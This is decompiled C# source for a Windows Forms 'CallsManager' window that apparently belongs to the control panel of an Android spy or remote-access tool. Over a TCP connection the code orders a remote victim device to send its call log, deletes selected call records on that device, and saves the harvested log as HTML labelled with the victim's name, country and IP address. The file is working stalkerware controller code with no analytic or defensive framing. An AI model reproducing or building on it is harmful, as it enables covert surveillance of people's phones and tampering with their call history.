using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200003C RID: 60
[DesignerGenerated]
public partial class CallsManager : Form
{
	// Token: 0x060002A9 RID: 681 RVA: 0x00048AB4 File Offset: 0x00046CB4
	public CallsManager()
	{
		base.Load += this.CallsManager_Load;
		base.Activated += this.AngelAndroidForm_Activated;
		base.Deactivate += this.AngelAndroidForm_Deactivate;
		this.Title = "null";
		this.BoxTitlePaintEventArgsWait = false;
		this.InitializeComponent();
	}

	// Token: 0x060002AC RID: 684 RVA: 0x00049498 File Offset: 0x00047698
	private void SpyStyle()
	{
		this.BoxTitle.BackColor = SpySettings.DefaultColor_Background;
		foreach (DataGridView dataGridView in base.Controls.OfType<DataGridView>())
		{
			dataGridView.BackgroundColor = SpySettings.DefaultColor_Background;
			dataGridView.BackColor = SpySettings.DefaultColor_Background;
			dataGridView.ColumnHeadersDefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			dataGridView.DefaultCellStyle.BackColor = SpySettings.DefaultColor_Background;
			dataGridView.DefaultCellStyle.SelectionForeColor = SpySettings.DefaultColor_Background;
			dataGridView.DefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
			dataGridView.DefaultCellStyle.SelectionBackColor = SpySettings.DefaultColor_Foreground;
			dataGridView.ColumnHeadersDefaultCellStyle.ForeColor = SpySettings.DefaultColor_Foreground;
		}
	}

	// Token: 0x060002AD RID: 685 RVA: 0x00049570 File Offset: 0x00047770
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x060002AE RID: 686 RVA: 0x000495B8 File Offset: 0x000477B8
	private void CallsManager_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\5.ico");
		this.SpyStyle();
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
		}
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
		this.BoxTitlePaintEventArgsWait = true;
	}

	// Token: 0x060002AF RID: 687 RVA: 0x0004966C File Offset: 0x0004786C
	private void DeleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Tag);
					if (this.classClient != null)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".calls",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"del",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
						this.DGV0.Rows.RemoveAt(this.DGV0.SelectedRows[i].Index);
					}
				}
			}
		}
	}

	// Token: 0x060002B0 RID: 688 RVA: 0x000497CC File Offset: 0x000479CC
	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".calls",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.getCalls,
					Data.SPL_SOCKET,
					"calls"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060002B1 RID: 689 RVA: 0x00049880 File Offset: 0x00047A80
	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				"null",
				saveFileDialog.FileName,
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Call Log",
				"log",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	// Token: 0x060002B2 RID: 690 RVA: 0x00049954 File Offset: 0x00047B54
	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(this.classClient);
		ThreadPool.QueueUserWorkItem(delegate(object a0)
		{
			reso.SAVEit((Array)a0);
		}, new object[]
		{
			this.DGV0,
			this.tmpFolderUSER,
			"Calls Manager",
			this.tmpClientName,
			this.tmpCountry + " - " + this.tmpAddressIP,
			"Call Log",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	// Token: 0x060002B3 RID: 691 RVA: 0x00049A04 File Offset: 0x00047C04
	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (this.BoxTitlePaintEventArgsWait)
			{
				int count = this.DGV0.Rows.Count;
				string str = "All " + Conversions.ToString(count);
				string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, reso.f);
				Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (this.BoxTitle.Height != size2.Height + 3)
				{
					this.BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	// Token: 0x060002B4 RID: 692 RVA: 0x0000270F File Offset: 0x0000090F
	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060002B5 RID: 693 RVA: 0x0000270F File Offset: 0x0000090F
	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060002B6 RID: 694 RVA: 0x0000270F File Offset: 0x0000090F
	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060002B7 RID: 695 RVA: 0x0000270F File Offset: 0x0000090F
	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060002B8 RID: 696 RVA: 0x0000270F File Offset: 0x0000090F
	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060002B9 RID: 697 RVA: 0x0000270F File Offset: 0x0000090F
	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x04000321 RID: 801
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	// Token: 0x04000322 RID: 802
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	// Token: 0x04000323 RID: 803
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	// Token: 0x04000324 RID: 804
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	// Token: 0x04000325 RID: 805
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	// Token: 0x04000326 RID: 806
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x04000327 RID: 807
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	private PictureBox _BoxTitle;

	// Token: 0x04000328 RID: 808
	public TcpClient Client;

	// Token: 0x04000329 RID: 809
	public Client classClient;

	// Token: 0x0400032A RID: 810
	public string Title;

	// Token: 0x0400032B RID: 811
	public string tmpFolderUSER;

	// Token: 0x0400032C RID: 812
	public string tmpClientName;

	// Token: 0x0400032D RID: 813
	public string tmpCountry;

	// Token: 0x0400032E RID: 814
	public string tmpAddressIP;

	// Token: 0x0400032F RID: 815
	private bool BoxTitlePaintEventArgsWait;
}
